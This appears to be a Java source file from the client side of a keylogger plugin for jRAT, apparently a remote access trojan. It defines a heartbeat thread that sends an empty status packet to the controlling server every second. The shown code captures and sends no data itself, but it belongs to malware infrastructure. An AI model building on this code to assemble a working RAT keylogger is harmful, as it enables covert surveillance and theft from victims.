package pro.jrat.plugin.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATObject;

public class HeartbeatThread implements Runnable {

	private boolean enabled;
	private RATObject server;

	public HeartbeatThread(RATObject server) {
		this.server = server;
		this.enabled = true;
	}
	
	public void toggle() {
		enabled = !enabled;
	}

	@Override
	public void run() {
		while (enabled) {
			try {
				Thread.sleep(1000L);
				
				if (!enabled) {
					break;
				}

				server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.STATUS_HEADER, server) {
					@Override
					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
						
					}
				});

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

}
